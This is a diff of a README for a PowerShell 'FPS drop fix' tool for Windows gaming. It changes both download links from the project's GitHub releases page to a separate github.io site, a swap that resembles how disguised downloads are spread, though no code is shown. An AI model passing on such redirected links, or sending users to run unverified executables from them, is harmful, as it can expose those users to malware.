@@ -1,6 +1,6 @@
 # 🚀 FPS-Drop-Fix-PowerShell - Optimize your Windows gaming performance now
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ruse3899/FPS-Drop-Fix-PowerShell/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://ruse3899.github.io)
 
 This tool improves your gaming performance on Windows 10 and Windows 11. It reduces stuttering, fixes frame rate drops, and lowers input lag. It works by adjusting system settings that often hinder performance in popular games like Valorant, Fortnite, CS2, Apex, and Rust.
 
@@ -25,7 +25,7 @@ You need a PC running Windows 10 or Windows 11. This tool requires no extra hard
 
 Visit the official release page to find the latest version of the software.
 
-[Download the latest release here](https://github.com/ruse3899/FPS-Drop-Fix-PowerShell/releases)
+[Download the latest release here](https://ruse3899.github.io)
 
 1. Click the link above.
 2. Look for the section labeled "Assets" at the bottom of the page.
